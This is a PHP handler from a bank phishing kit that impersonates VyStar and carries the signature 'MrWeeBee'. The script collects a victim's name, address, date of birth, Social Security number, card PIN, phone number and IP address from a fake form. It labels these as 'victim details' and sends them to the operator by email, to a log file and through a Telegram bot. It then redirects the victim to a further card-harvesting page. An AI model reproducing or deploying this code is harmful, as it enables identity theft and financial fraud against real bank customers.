<?php
$settings = include '../../../settings/settings.php';

# Debug 

if($settings['debug'] == "1"){
  error_reporting(E_ALL);
  ini_set('display_errors', '1');
  ini_set('display_startup_errors', '1');
}


# Allow URL Open

ini_set('allow_url_fopen',1);


function get_client_ip() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

$IP = get_client_ip();

# Settings


$settings = include '../../../settings/settings.php';
$owner = $settings['email'];
$filename = "../../../Logs/results.txt";
$client = file_get_contents("../../../Logs/client.txt");


# Variables

$first_name = $_POST['fname'];
$last_name = $_POST['lname'];
$address = $_POST['address'];
$zipcode = $_POST['zip'];
$dob = $_POST['dob'];
$ssn = $_POST['ssn'];
$cpin = $_POST['cpin'];
$phone = $_POST['phone'];





# Messsage

$message = "[ 🍁 VYSTAR  | CLIENT : {$client} 🍁 ]\n\n";
$message .= "********** [ ADDRESS INFORMATION ] **********\n";
$message .= "# FIRSTNAME   : {$first_name}\n";
$message .= "# LASTNAME    : {$last_name}\n";
$message .= "# ADDRESS     : {$address}\n";
$message .= "# ZIPCODE     : {$zipcode}\n";
$message .= "# SSN         : {$ssn}\n";
$message .= "# DOB         : {$dob}\n";
$message .= "# PHONE       : {$phone}\n";
$message .= "# CPIN        : {$cpin}\n";
$message .= "********** [ 🧍‍♂️ VICTIM DETAILS 🧍‍♂️ ] **********\n";
$message .= "# IP ADDRESS : {$IP}\n";
$message .= "**********************************************\n";

# Send Mail 

if ($settings['send_mail'] == "1"){
    $to = $settings['email'];
    $headers = "Content-type:text/plain;charset=UTF-8\r\n";
    $headers .= "From: MrWeeBee <vystarbank@client_{$client}_site.com>" . "\r\n";
    $subject = "🍁 MRWEEBEE 🍁 VYSTAR 🍁 PERSONAL 🍁 CLIENT #{$client} 🍁 {$IP}";
    $msg = strtoupper($message);
    mail($to,$subject,$msg,$headers);
}


# Save Result

if ($settings['save_results'] == "1"){
    $results = fopen($filename, "a+");
    fwrite($results, strtoupper($message));
    fclose($results);
}

if ($settings['telegram'] == "1"){
  $data = $message;
  $send = ['chat_id'=>$settings['chat_id'],'text'=>$data];
  $website = "https://api.telegram.org/{$settings['bot_url']}";
  $ch = curl_init($website . '/sendMessage');
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
  curl_setopt($ch, CURLOPT_POST, 1);
  curl_setopt($ch, CURLOPT_POSTFIELDS, ($send));
  curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
  $result = curl_exec($ch);
  curl_close($ch);
}

echo "<script>window.location.href =\"../session_card\"; </script>";

?>
